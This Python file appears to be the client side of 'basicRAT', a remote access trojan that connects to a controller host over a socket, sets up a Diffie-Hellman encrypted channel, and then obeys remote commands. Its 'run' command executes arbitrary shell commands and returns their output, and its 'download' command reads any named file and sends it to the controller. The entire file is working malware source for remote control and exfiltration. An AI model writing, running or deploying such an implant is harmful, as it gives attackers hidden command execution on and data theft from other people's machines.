#!/usr/bin/env python
# -*- coding: utf-8 -*-

from basicRAT import *

HOST = 'localhost'
PORT = 1337
FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"

def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    DHKEY = diffiehellman(s)
    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
    
    while True:
        data = s.recv(1024)
        data = decrypt(data, DHKEY)

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = os.popen(action).read()
            s.sendall(encrypt(results, DHKEY))

        # send file
        elif cmd == 'download':
            f_name = action.split()[0]

            f = open(f_name, 'rb')
            results = f.read(1024)
            while True:
                s.send(encrypt(results, DHKEY))
                results = f.read(1024)
                if results == '':
                    break
                
        # regenerate DH key (dangerous! may cause connection loss)
        # available in case a fallback occurs or you suspect evesdropping
        elif cmd == 'rekey':
            DHKEY = diffiehellman(s)
            #print binascii.hexlify(DHKEY) #debug


if __name__ == '__main__':
    PORT = int(sys.argv[1]) if len(sys.argv)>1 else 1337
    main()
